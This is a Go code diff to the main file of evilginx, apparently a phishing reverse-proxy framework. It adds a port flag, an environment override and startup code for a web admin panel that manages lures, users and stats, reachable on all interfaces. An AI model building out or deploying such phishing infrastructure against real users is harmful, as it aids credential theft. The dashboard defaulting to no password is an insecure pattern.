@@ -9,6 +9,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"strconv"
 	"strings"
 	"syscall"
 
@@ -37,6 +38,9 @@ var dashboard_addr = flag.String("dashboard", "0.0.0.0:5000", "Dashboard listen 
 var dashboard_user = flag.String("dashboard-user", "admin", "Dashboard username")
 var dashboard_pass = flag.String("dashboard-pass", "", "Dashboard password (empty = no auth)")
 
+// Web Admin panel (webapi) flags
+var webapi_port = flag.Int("webapi-port", 8082, "Web admin panel (login page, users, stats, lures) listen port (set 0 to disable)")
+
 func joinPath(base_path string, rel_path string) string {
 	var ret string
 	if filepath.IsAbs(rel_path) {
@@ -61,14 +65,12 @@ func main() {
 	// ------------------------------------------------------------------------
 	// ENVIRONMENT VARIABLE OVERRIDES (used by Docker)
 	// ------------------------------------------------------------------------
-	// These run AFTER flag parsing, so:
-	//   - if you pass a flag on the command line (e.g. evilginx -dashboard ...)
-	//     the flag wins only if no env var is set for that option,
-	//   - if the env var exists, it overrides the default.
-	// DASHBOARD_ADDR  -> listen address, e.g. "0.0.0.0:5000". Set to "" to disable.
-	// DASHBOARD_USER   -> dashboard username
-	// DASHBOARD_PASS   -> dashboard password (empty = dashboard has NO login)
-	// DASHBOARD_ENABLED -> set to "false"/"0"/"no"/"off" to turn dashboard off
+	// These run AFTER flag parsing:
+	//   DASHBOARD_ADDR   -> simple dashboard listen address (e.g. "0.0.0.0:5000"). "" disables it.
+	//   DASHBOARD_USER   -> simple dashboard username
+	//   DASHBOARD_PASS   -> simple dashboard password (empty = no auth)
+	//   DASHBOARD_ENABLED-> "false"/"0"/"no"/"off" turns the simple dashboard off
+	//   WEBAPI_PORT      -> web admin panel port (default 8082). "0" disables it.
 	if v, ok := os.LookupEnv("DASHBOARD_ADDR"); ok {
 		*dashboard_addr = v
 	}
@@ -81,6 +83,11 @@ func main() {
 	if v, ok := os.LookupEnv("DASHBOARD_ENABLED"); ok {
 		if v == "false" || v == "0" || v == "no" || v == "off" {
 			*dashboard_addr = ""
+		}
+	}
+	if v, ok := os.LookupEnv("WEBAPI_PORT"); ok {
+		if p, err := strconv.Atoi(v); err == nil {
+			*webapi_port = p
 		}
 	}
 
@@ -255,7 +262,18 @@ func main() {
 	core.GetTelegramQueue().Start()
 	defer core.GetTelegramQueue().Stop()
 
-	// Initialize and start the web dashboard
+	// ------------------------------------------------------------------------
+	// Web Admin panel (webapi) — the fancy dashboard:
+	// login page, users, roles, stats, lures management.
+	// Listens on 0.0.0.0:<port> so it is reachable from your browser.
+	// It must be created AFTER hp (it holds a reference to the proxy).
+	// ------------------------------------------------------------------------
+	if *webapi_port > 0 {
+		webapi := core.NewWebAPI(db, cfg, ns, hp)
+		webapi.Start(*webapi_port)
+	}
+
+	// Initialize and start the simple web dashboard (port 5000)
 	dashboardEnabled := *dashboard_addr != ""
 	var dashboardCfg *core.DashboardConfig
 	if dashboardEnabled {
